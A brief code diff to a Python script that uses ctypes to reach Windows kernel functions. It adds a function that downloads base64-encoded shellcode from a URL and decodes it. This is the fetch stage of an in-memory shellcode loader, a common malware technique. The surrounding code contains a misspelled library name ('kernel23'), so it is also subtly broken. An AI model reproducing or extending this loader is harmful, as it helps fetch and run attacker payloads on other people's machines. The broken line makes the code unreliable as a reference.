@@ -10,4 +10,9 @@ import ctypes
 
 kernel32 = ctypes.windll.kernel23
 
+def get_code(url):
+    with request.urlopen(url) as response:
+        shellcode = base64.decodebytes(response.read())
+    return shellcode
+
  
